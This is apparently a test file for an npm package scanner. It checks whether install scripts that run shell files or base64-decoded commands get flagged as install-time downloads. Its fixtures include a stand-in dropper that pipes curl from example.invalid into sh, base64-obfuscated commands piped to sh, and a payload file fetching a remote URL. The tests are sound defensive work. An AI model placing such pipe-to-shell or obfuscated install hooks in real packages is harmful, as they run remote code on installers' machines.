// Install-time reading of what only the shell reading runs: a script an added run hands a shell, and a file the reading
// plan passed over before the shell reading ran it. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, findingsOf, planLayers, type AnalyzeInput, type TarEntry } from "../src/index.ts";
import { shellOperands } from "../src/scripts.ts";

const enc = new TextEncoder();
const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
const DROPPER = "curl -s https://example.invalid/x.sh | sh";

function scoreOf(manifest: Partial<AnalyzeInput["manifest"]>, files: TarEntry[] = []) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const a = analyze({ name: "probe-pkg", manifest: m, files: [file("package.json", JSON.stringify(m)), ...files], publisher: "a", previousPublishers: [] });

  return finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.map((s) => s.id);
}

describe("what only the shell reading runs gets its install-time checks", () => {
  test("a shell script the baseline walk already read is still a download when an added run runs it", () => {
    const setup = file("setup.sh", `#!/bin/sh\n${DROPPER}\n`);

    expect(scoreOf({ main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "sh ./setup.sh" } }, [file("index.js", "1;\n"), setup])).toContain("install-download");
  });

  test("a file it only names or prints, or one the walk did not hold, gets no check", () => {
    const setup = file("setup.sh", `#!/bin/sh\n${DROPPER}\n`);

    const ofDemo = (demo: string, maxScannedBytes?: number) => {
      const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "npm run '-s' demo", demo } };

      return analyze({ name: "probe-pkg", manifest, files: [file("package.json", JSON.stringify(manifest)), file("index.js", "1;\n"), setup], publisher: "a", previousPublishers: [], maxScannedBytes });
    };

    const runs = [ofDemo("printf '%s\\n' ./setup.sh"), ofDemo("printf '%s\\n' 'example: sh ./setup.sh'"), ofDemo("sh ./setup.sh", 0)];

    for (const a of runs) expect(findingsOf(a).flatMap((s) => s.evidence).some((e) => e.startsWith("setup.sh: run by an install script"))).toBe(false);
  });

  test("only a shell's operand counts, as the shell hands it over", () => {
    expect(shellOperands("FOO=1 sh ./a.sh; bash b.sh && 'sh' c.sh")).toEqual(["./a.sh", "b.sh", "c.sh"]);
    expect(shellOperands("printf '%s\\n' 'sh ./a.sh'; sh -c ./b.sh; sh \"$X\"; 'A=1' sh ./c.sh; echo sh ./d.sh")).toEqual([]);
  });
});

describe("the reading plan", () => {
  const viaShell = (n: string): string => `echo '${btoa(`sh ./${n}.so; printf safe`)}' | base64 -d | sh`;

  test("a file the plan passed over as not holdable is held once an added run runs it", () => {
    const run = btoa("node ./payload.so");
    const manifest = { name: "probe-pkg", version: "1.0.0", main: "index.js", scripts: { postinstall: "npm run '-s' x", x: `echo '${run}' | base64 -d | sh` } };
    const files = [file("index.js", "require('./payload.so');\n"), file("payload.so", "require('https').get('https://example.invalid/x');\n")];
    const plan = planLayers({ manifest, files, imports: new Map([["index.js", ["./payload.so"]]]), budget: 100000 });

    expect([...plan.production, ...plan.extra]).toContain("payload.so");
  });

  test("a reconsidered file only takes what the earlier plan left", () => {
    const manifest = { name: "probe-pkg", version: "1.0.0", main: "index.js", scripts: { postinstall: "npm run '-s' new; npm run '-s' old", new: viaShell("new"), old: viaShell("old") } };
    const index = file("index.js", "require('./new.so');");
    const files = [index, file("new.so", "printf TEST\n"), file("old.so", "printf TEST\n")];
    const plan = planLayers({ manifest, files, imports: new Map([["index.js", ["./new.so"]]]), budget: index.size + 12 });

    expect([...plan.extra]).toEqual(["old.so"]);
  });
});
